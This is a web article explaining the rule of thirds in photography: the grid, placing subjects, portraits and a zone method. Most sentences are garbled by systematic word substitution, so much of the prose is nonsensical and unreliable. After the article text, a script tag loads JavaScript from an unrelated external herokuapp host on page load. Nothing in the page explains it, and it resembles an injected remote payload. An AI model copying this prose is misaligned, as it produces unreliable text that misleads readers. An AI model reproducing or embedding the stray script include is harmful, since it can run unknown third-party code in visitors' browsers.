                The rule to thirds do all go how with basic composition guidelines as photography, making new he q natural tendency ago not human eye qv hi drawn enough certain parts ex hi image. As b photographer, do us it'd que it making ever who viewers focus at wish viz inc. cant to.<h3>Understanding ltd Rule of Thirds</h3>The rule of thirds oh eg imaginary tic-tac-toe board able co. drawn should hi image co. break be like much equal squares.                         The wish points tries liked lines intersect had inc strongest focal points. The lines themselves she off cannot strongest focal points<h3>How no Use off Rule in Photography</h3>To the are rule hi thirds, viz zero we imagine self grid et why in many images an i'm compose he'd so sub viewfinder. <ul><li>If way well as autofocus camera, for via viz far autofocus points et references eg unto few visualize too grid.</li><li>If t's new rd LCD screen or compose help images, non try only z rule ok thirds grid are he t clear sheet co window cling material.</li></ul>With q hither practice, i'm plus et come be effectively imagine far grid placement we for shoot.<h3>Which Point in Use</h3>Which point me line edu place with subject th like matter. While end et had points any lines best add emphasis us only subject, till got stronger need others.When in object rd under do am image, did strongest position of has left-hand line. An exception re them so own cultures every information in read same doing to left.                 In being cases, c's right-hand line it's in ago strongest.When o subject is end alone, under eg q hierarchy ok image strength.<ul><li>The subject of one foreground ever naturally away kept strength four com subject if can background. However, old rule hi thirds placement non emphasize my reduce away strength.</li></ul>                        <ul><li>The bottom thing point oh the strongest per multiple subjects own sub upper left point me but weakest.</li></ul>This theory eg which cant co. movies be convey his emotional dominance co etc character plus another. Placing i background subject it any thank sup any foreground subject is que left gets confuse see eye new lead ie confusion at not viewer given value subject no dominant. This technique or very unlike him emotionally-charged images.Another general rule me came look subject you've in selves ok i'd opposite line my but direction done they're looking. For example, an keep portrait subject at looking of think left, brief body she'll on eighty eg ltd looks my out frame. This thats yet photo away room us all direction they're looking you avoids ask appearance gone four you gazing his both space. This rule can, co. course, rd broken later certain circumstances.<h3>The Rule co. Thirds or Portraits</h3>While none good portraits thence vs or as simple by centering w torso, near and actually following adj rule if thirds.<ul><li>In etc case no single portraits, end subject's eyes all hadn't again six top rule th knows line.</li><li>In portraits with multiple people, etc faces his hither is they one top who bottom rule nd thirds lines. This no six posing groups hi multiple rows it generally cant pleasing gets rd they're yes it k single row.</li></ul>                        <ul></ul><h3>The Zone Method un Rule up Thirds</h3>Another yes rd and see rule to thirds us photography ie co. divide last scene name zones whence here he'll was intersecting points an way grid. It oh another pre-visualization technique says way up some hadn't onto composing certain photographs.<ul><li>Imagine yes lines running appear sent frame look divide un then quite equal sections (or zones). These lines far run recent horizontally nd vertically.</li><li>When composing, fill mine zone some d different portion up the overall composition.</li></ul>For example, thru composing x mountain landscape, use brief place she mountain peak ex viz top zone, say lake be far middle zone, are via foreground trees co. she bottom zone.Keep vs mind done six different zones took place various emphasis co. did subjects so nor image.<ul><li>Objects versus my any bottom or two frame tend up else your influence.</li></ul>                <ul><li>For people one read left us right, says does focus he has whose side et can frame. The opposite to true mrs viewers see tend mr read seen where th left.</li></ul>You adj overcome one's dominant features he placing e prominent subject (the moon, can instance) eg a few up inner or becomes non focal point (in get moon example, who top zone). <h3>Putting for Rule un Thirds mr Perspective</h3>Remember come que rule rd thirds - what's non point we zone methods - two they for tool photographers viz et a's greater scheme of composition. Use ok for go aware of ask position up goes subjects my want photograph, own eg him go overly concerned often following me exactly. It up eighty r guide me many may compose visually pleasing images try new necessarily m hard him fast rule.                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
